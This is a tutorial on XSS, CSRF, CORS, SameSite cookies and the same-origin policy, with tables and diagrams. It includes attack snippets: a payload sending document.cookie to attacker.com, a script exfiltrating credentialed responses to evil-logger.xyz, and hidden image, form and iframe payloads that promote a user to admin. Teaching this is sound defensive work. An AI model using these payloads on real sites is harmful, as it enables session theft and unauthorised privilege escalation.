# XSS, CSRF, CORS, and SameSite Cookies: 
# A Technical Overview for Security Testing and Exploitation

## 1. Cross-Site Scripting (XSS)

### Definition

XSS occurs when an attacker can inject malicious JavaScript into a webpage viewed by other users. This can be used to steal cookies, perform actions on behalf of a victim, or escalate access.

### Types

* **Stored XSS**: Injected script is saved server-side (e.g., in a comment or user profile).
* **Reflected XSS**: Payload appears in a URL or request and is reflected in the page.
* **DOM-based XSS**: JavaScript on the page dynamically processes attacker-controlled input.

### Common Exploit Payload

```javascript
window.location = 'https://attacker.com/steal?c=' + document.cookie;
```

## 2. Cross-Site Request Forgery (CSRF)

### Definition

CSRF occurs when a malicious site causes a user’s browser to perform an unwanted action on a different site where they are authenticated.

### Requirements for Exploitation

* Victim must be authenticated on the target site
* Session cookies must be automatically sent with the forged request
* The action must be triggerable without interaction (e.g., GET or auto-submitted POST)

### Example (GET CSRF via XSS)

```javascript
let img = new Image();
img.src = 'https://target-vhost.internal/profile.php?promote=admin';
```

### Example (POST CSRF via injected form)

```javascript
let form = document.createElement('form');
form.method = 'POST';
form.action = 'https://target-vhost.internal/profile.php';

let input = document.createElement('input');
input.type = 'hidden';
input.name = 'promote';
input.value = 'admin';
form.appendChild(input);

document.body.appendChild(form);
form.submit();
```

## 3. Cross-Origin Resource Sharing (CORS)

### Definition

CORS is a security mechanism that governs how web applications interact with resources from a different origin.

### CORS Headers

* `Access-Control-Allow-Origin`
* `Access-Control-Allow-Methods`
* `Access-Control-Allow-Headers`

### Relevance to Attackers

* **If CORS is misconfigured** (e.g., allows `*` or reflects origin without validation), attackers can read sensitive cross-origin responses.
* **Does not apply to CSRF**: CORS protects reading responses, not sending authenticated requests.

## 4. SameSite Cookies

### Definition

SameSite is a cookie attribute that controls whether cookies are sent with cross-site requests.

### Modes

* `SameSite=Strict`: Cookies not sent on any cross-site request.
* `SameSite=Lax`: Cookies sent on top-level navigations (e.g., `<a href>`), but not on background requests (`img`, `fetch`, `iframe`).
* `SameSite=None`: Cookies are sent with all requests **only if** the cookie is marked `Secure`.

### Relevance to Exploitation

* **CSRF fails if SameSite is Strict or Lax** and request is backgrounded (`img.src`, `fetch`) and not a top-level navigation.
* **XSS bypasses SameSite** because the malicious script runs in the same origin.

## 5. Attack Chain: XSS to CSRF

### Goal: Exploit XSS to trigger a privileged action via CSRF

#### Example Chain

1. Inject XSS payload into comment or profile page.
2. Wait for admin to view the page (stored XSS).
3. XSS payload auto-submits a form or triggers a GET request with the admin’s cookies.
4. Admin is unknowingly tricked into performing a privileged action (e.g., promoting a user).

### Example Full Payload

```javascript
let i = document.createElement('iframe');
i.src = 'https://target-vhost.internal/profile.php?promote=admin';
i.style.display = 'none';
document.body.appendChild(i);
```

---

## Summary Table

### Mechanism Overview

| Mechanism | Primary Purpose                                    | Exploitable Scenario Example                                    |
| --------- | -------------------------------------------------- | --------------------------------------------------------------- |
| XSS       | Run attacker-controlled JS in victim’s browser     | Stealing session cookies, launching in-browser CSRF             |
| CSRF      | Trigger state-changing action using victim’s creds | Auto-submitting hidden form to promote a user                   |
| CORS      | Control cross-origin reads                         | Leaking sensitive data to attacker origin if misconfigured      |
| SameSite  | Regulate cross-origin cookie use                   | Preventing passive requests from sending cookies unless allowed |

### Behavior Matrix (Expanded)

| Request Type                   | Description                             | Will Cookies Be Sent? | Can Response Be Read?         | CSRF Possible?         |
| ------------------------------ | --------------------------------------- | --------------------- | ----------------------------- | ---------------------- |
| `<img src>` from attacker.com  | Passive image load                      | ❌ if SameSite≠None    | ❌ (no JS access)              | ❌ unless SameSite=None |
| `<form>` submission (GET/POST) | Auto-submitted background form          | ✅ if SameSite=None    | ❌ (no access to response)     | ✅ if SameSite allows   |
| `fetch()` with no credentials  | Cross-origin API read attempt           | ❌                     | ✅ if CORS headers are correct | ❌ (no cookie use)      |
| `fetch()` with credentials     | Cross-origin with user cookies          | ✅ if SameSite=None    | ✅ if CORS allows it           | ❌ (read access only)   |
| XSS-local form submission      | Same-origin JS executes form submission | ✅                     | ✅                             | ✅                      |

---

## 6. Browser Behavior and CORS/CSRF Interaction

### Cross-Origin Request Flow Diagram (Illustrative)

```
+------------------+        +------------------------+        +--------------------------+
|  Attacker Site   | -----> |  Victim's Browser      | -----> |  Target Application      |
| (evil.com)       |        |  (origin: attacker.com)|        | (origin: target.internal)|
+------------------+        +------------------------+        +--------------------------+
                                  |                                 ^
                                  |  Sends cookies?                |
                                  |  Follows CORS/SameSite rules   |
                                  +--------------------------------+
```

### XSS Execution Flow Diagram

```
+-----------------------------+
| Victim loads vulnerable page|
| (e.g. /profile.php?id=123)  |
+-------------+---------------+
              |
              v
     Server reflects user input
         <script>alert(1)</script>
              |
              v
  +-------------------------------+
  | Victim browser executes script|
  | (e.g. document.cookie leak)   |
  +-------------------------------+
              |
              v
     Attacker receives data
     (e.g. via webhook, server)
```

### Extended Browser Request Table

| Vector                  | Origin Context | Sends Cookies?     | Can Read Response? | Notes                                                                |
| ----------------------- | -------------- | ------------------ | ------------------ | -------------------------------------------------------------------- |
| `<img src>`             | Cross-origin   | ❌ if SameSite≠None | ❌                  | Used for stealth beacons and CSRF; no JS access                      |
| `fetch()` (no creds)    | Cross-origin   | ❌                  | ✅ if CORS allows   | Only works for public APIs or misconfigured CORS                     |
| `fetch()` + credentials | Cross-origin   | ✅ if SameSite=None | ✅ if CORS allows   | Needs `credentials: 'include'` and correct CORS headers              |
| HTML `<form>` POST      | Cross-origin   | ✅ if SameSite=None | ❌                  | Best method for CSRF if cookies are permitted                        |
| Inline XSS JS           | Same-origin    | ✅                  | ✅                  | Full access: DOM, cookies, localStorage; can bypass all restrictions |

---




## 7. Same-Origin Policy & CORS Explained in Depth

### What is the Same-Origin Policy?

The Same-Origin Policy (SOP) is a critical browser security mechanism that prevents scripts on one origin from accessing resources on a different origin. 
An origin is defined by the tuple:

* **Scheme** (http, https)
* **Host** (domain or IP address)
* **Port** (default 80/443 or specified)

If any of these differ, the origins are not considered the same, and access is restricted.

#### Examples

| URL A                                                            | URL B                                                        | Same Origin? |
| ---------------------------------------------------------------- | ------------------------------------------------------------ | ------------ |
| [https://app.example.com](https://app.example.com)               | [https://app.example.com:443](https://app.example.com:443)   | ✅            |
| [https://app.example.com](https://app.example.com)               | [http://app.example.com](http://app.example.com)             | ❌            |
| [https://api.example.com](https://api.example.com)               | [https://app.example.com](https://app.example.com)           | ❌            |
| [https://internal.example.local](https://internal.example.local) | [https://internal.example.com](https://internal.example.com) | ❌            |

### Why SOP Matters

Without SOP, malicious websites could make background requests to intranet apps, banking sites, or cloud APIs, read sensitive responses, and exfiltrate user data without their knowledge.

#### Hypothetical Attack Without SOP

```javascript
<script>
  async function exfiltrate(url) {
    const response = await fetch(url, { credentials: 'include' });
    const data = await response.text();
    await fetch("https://evil-logger.xyz/log?d=" + btoa(data));
  }
  exfiltrate("https://private-internal.local/admin");
  exfiltrate("https://email.example.xyz/inbox");
  exfiltrate("http://192.168.1.1/");
</script>
```

Without SOP, responses to these fetch calls could be read and exfiltrated, even if the victim is authenticated via cookies.

---

### Exceptions to SOP: img/script/link Cross-Origin Loads

Certain resources can be loaded across origins by design:

* `<img src="https://cdn.site.com/image.png">`
* `<script src="https://cdn.site.com/lib.js">`
* `<link href="https://cdn.site.com/style.css" rel="stylesheet">`

However, these cannot be inspected or modified from JavaScript unless explicitly permitted (e.g. via CORS).

---

### What is CORS (Cross-Origin Resource Sharing)?

CORS is a browser-enforced security standard that allows servers to define rules that permit specific cross-origin interactions.

#### Common CORS Headers

| Header                             | Purpose                                                 |
| ---------------------------------- | ------------------------------------------------------- |
| `Access-Control-Allow-Origin`      | Specifies which origins are allowed to read responses   |
| `Access-Control-Allow-Methods`     | Lists allowed HTTP methods for cross-origin requests    |
| `Access-Control-Allow-Headers`     | Lists permitted custom headers in cross-origin requests |
| `Access-Control-Allow-Credentials` | Allows cookies or auth headers if set to true           |
| `Access-Control-Expose-Headers`    | Specifies which response headers are exposed to JS      |
| `Access-Control-Max-Age`           | Caches preflight response for defined time              |

### Simple vs. Preflighted Requests

* **Simple Requests** (no preflight): GET, POST (form-encoded), no custom headers
* **Preflighted Requests**: Everything else — the browser sends an `OPTIONS` request to verify permissions

#### Example: Preflight Workflow for JSON POST

**Step 1: Preflight Request**

```
OPTIONS /data HTTP/1.1
Origin: https://frontend.app.local
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

**Step 2: Server Response**

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://frontend.app.local
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Credentials: true
```

**Step 3: Actual Request**

```javascript
fetch("https://api.service.local/data", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  credentials: "include",
  body: JSON.stringify({ message: "hello" })
});
```

If the CORS headers were missing or invalid, the browser would block the response from being read — **but not the request from being sent**.

---

### CSRF Risk Despite SOP & CORS

While SOP protects against reading responses, it does **not prevent** cross-origin requests from being made. This allows:

* `<form>`-based CSRF
* `<img>`-based CSRF beacons
* `fetch()`-based actions that don't require reading responses

Only anti-CSRF tokens and SameSite cookie flags stop CSRF from succeeding.

---

### Summary Diagram

```
  [ Browser Context: https://evil.attacker ]
                  |
    1. Makes background request with cookies
                  v
        https://api.victim.local/update
                  |
                  v
    [ Server receives request + cookies ]
        X  Response is blocked by SOP
        ✓  Action may still succeed (CSRF)
```


---

### Detailed CORS & SameSite Header Table

| Header                             | Role/Function                                                      | Example Value                  | Scenario                                                                 |
| ---------------------------------- | ------------------------------------------------------------------ | ------------------------------ | ------------------------------------------------------------------------ |
| `Access-Control-Allow-Origin`      | Specifies which origin(s) can access the resource                  | `https://frontend.example.com` | Required to allow cross-origin fetch from frontend to API                |
| `Access-Control-Allow-Methods`     | Lists allowed HTTP methods on cross-origin requests                | `GET, POST, OPTIONS`           | Set in response to preflight OPTIONS request                             |
| `Access-Control-Allow-Headers`     | Specifies allowed request headers                                  | `Content-Type, Authorization`  | Needed if fetch uses custom headers                                      |
| `Access-Control-Allow-Credentials` | Indicates cookies/credentials can be sent on cross-origin requests | `true`                         | Required for cookie-based auth (must match request credentials: include) |
| `Access-Control-Expose-Headers`    | Allows frontend JavaScript to read specific headers from response  | `X-Custom-Header`              | Enables reading token headers in response                                |
| `Access-Control-Max-Age`           | Time (in seconds) browser caches the preflight response            | `86400`                        | Avoids frequent OPTIONS requests                                         |

---

### Preflight Request Structure (OPTIONS)

```
OPTIONS /api/update HTTP/1.1
Origin: https://frontend.app.local
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization
```

### Required Preflight Server Response

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://frontend.app.local
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

---

### SameSite Cookie Behavior Table

| SameSite Mode | Cross-Site `<form>`/`<img>` Request | JavaScript Access (XSS) | Requires `Secure` Flag | Notes                                          |
| ------------- | ----------------------------------- | ----------------------- | ---------------------- | ---------------------------------------------- |
| `Strict`      | ❌ Not sent                          | ✅ Same-origin only      | Optional               | Strongest CSRF defense; breaks some auth flows |
| `Lax`         | ✅ Sent only on top-level GET links  | ✅ Same-origin only      | Optional               | Allows GET forms but blocks background fetch   |
| `None`        | ✅ Always sent                       | ✅ Same-origin only      | ✅ Required             | Full cross-site support; must be HTTPS         |

---

### Example Cross-Origin CORS Interaction Diagram

```
+--------------------+     CORS-preflight     +--------------------------+
|  JS (frontend app) | ---------------------> |   Backend API Server     |
|  Origin A          | <--------------------- |  Origin B                |
|  fetch() + creds   |     CORS-allowed       |  Validated & Permitted   |
+--------------------+                        +--------------------------+
```

```
Legend:
- Origin A: https://frontend.example.com
- Origin B: https://api.example.internal
- Requires Access-Control-Allow-Credentials + specific origin whitelisting
```

---


